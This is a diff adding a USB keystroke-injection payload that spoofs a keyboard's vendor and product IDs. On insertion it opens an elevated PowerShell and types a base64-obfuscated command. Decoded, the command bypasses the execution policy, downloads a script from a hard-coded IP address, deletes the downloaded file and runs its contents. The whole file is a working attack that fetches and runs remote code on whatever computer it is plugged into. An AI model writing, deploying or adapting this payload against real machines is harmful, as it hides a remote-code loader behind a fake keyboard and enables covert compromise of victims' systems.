@@ -1,0 +1,9 @@
+REM Megawin Tech, Truly Ergonomic Keyboard
+ATTACKMODE HID VID_0E6A PID_030C
+DELAY 1000
+WINDOWS r
+STRING powershell.exe -Command "Start-Process PowerShell -Verb RunAs"
+ENTER
+STRING Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZvcmNlOyBJbnZva2UtV2ViUmVxdWVzdCAnaHR0cDovLzM1Ljk0LjU2LjQ1L2xzLnBzMScgLU91dGZpbGUgc3BvaW5ndXM7ICRiaW5ndXMgPSBjYXQgc3BvaW5ndXM7IHJtIHNwb2luZ3VzOyBJbnZva2UtRXhwcmVzc2lvbiAkYmluZ3Vz")))
+ENTER
+
